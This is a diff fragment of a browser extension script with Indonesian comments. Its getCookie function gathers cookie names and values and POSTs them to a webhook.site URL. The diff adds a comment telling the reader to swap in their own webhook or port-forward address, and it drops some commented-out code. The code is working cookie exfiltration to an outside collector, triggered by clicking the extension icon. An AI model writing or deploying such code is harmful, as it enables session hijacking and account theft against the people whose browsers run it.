@@ -9,7 +9,7 @@ function getCookie() {
 		});
 
 		var xhr = new XMLHttpRequest();
-		xhr.open("POST", "https://webhook.site/4c69d1d9-da93-4419-8c1c-e1c73d89311f", true);
+		xhr.open("POST", "https://webhook.site/4c69d1d9-da93-4419-8c1c-e1c73d89311f", true); // ganti dengan url port forward atau webhook kamu
 		xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 		xhr.onload = function () {
@@ -26,15 +26,9 @@ function getCookie() {
 			console.error("Error sending data:", xhr.statusText);
 		};
 		var data = JSON.stringify({ nama: cookieName, isi: cookieVal });
-		// var params = new URLSearchParams();
-		// for (var i = 0; i < cookieName.length; i++) {
-		// 	params.append("nama", cookieName[i]);
-		// 	params.append("isi", cookieVal[i]);
-		// }
 
 		xhr.send(data);
 	});
 }
 
-// Menjalankan fungsi getCookie saat ikon ekstensi diklik
 browser.browserAction.onClicked.addListener(getCookie);
